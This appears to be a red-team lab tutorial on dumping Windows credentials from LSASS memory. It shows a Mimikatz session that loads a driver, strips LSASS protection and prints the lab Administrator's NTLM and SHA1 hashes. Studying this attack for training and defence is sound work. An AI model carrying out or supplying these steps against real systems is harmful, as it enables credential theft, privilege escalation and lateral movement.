# Local Security Authority Subsystem Service

Local Security Authority Server Service (LSASS) is a Windows process that handles the operating system security 
policy and enforces it on a system. It verifies logged in accounts and ensures passwords, hashes, and Kerberos 
tickets. Windows system stores credentials in the LSASS process to enable users to access network resources, 
such as file shares, SharePoint sites, and other network services, without entering credentials every time a 
user connects.

Thus, the LSASS process is a juicy target for red teamers because it stores sensitive information about user accounts. 
The LSASS is commonly abused to dump credentials to either escalate privileges, steal data, or move laterally. If we 
have administrator privileges, we can dump the process memory of LSASS. Windows system allows us to create a dump file, 
a snapshot of a given process. This could be done either with the Desktop access (GUI) or the command prompt. 
This attack is defined in the MITRE ATT&CK framework as "OS Credential Dumping: LSASS Memory (T1003)".

* To dump any running Windows process using the GUI, open the Task Manager, and from the Details tab, find the required 
process, right-click on it, and select "Create dump file".
* An alternative way to dump a process if a GUI is not available to us is by using `ProcDump`. `ProcDump` is a 
`Sysinternals` process dump utility that runs from the command prompt.
* Mimikatz is a well-known tool used for extracting passwords, hashes, PINs, and Kerberos tickets from memory using 
various techniques. Mimikatz is a post-exploitation tool that enables other useful attacks, such as pass-the-hash, 
pass-the-ticket, or building Golden Kerberos tickets. Mimikatz deals with operating system memory to access information  
and requires administrator and system privileges in order to dump memory and extract credentials.

## Protected LSASS and Mimikatz

To disable LSASS protection:

```text
C:\Tools\Mimikatz> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```

## Again

```text
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 515377 (00000000:0007dd31)
Session           : RemoteInteractive from 3
User Name         : Administrator
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 6/3/2022 8:30:44 AM
SID               : S-1-5-21-1966530601-3185510712-10604624-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : THM
         * NTLM     : 98d3a787a80d08385cea7fb4aa2a4261
         * SHA1     : 64a137cb8178b7700e6cffa387f4240043192e72
         * DPAPI    : bc355c6ce366fdd4fd91b54260f9cf70
...
```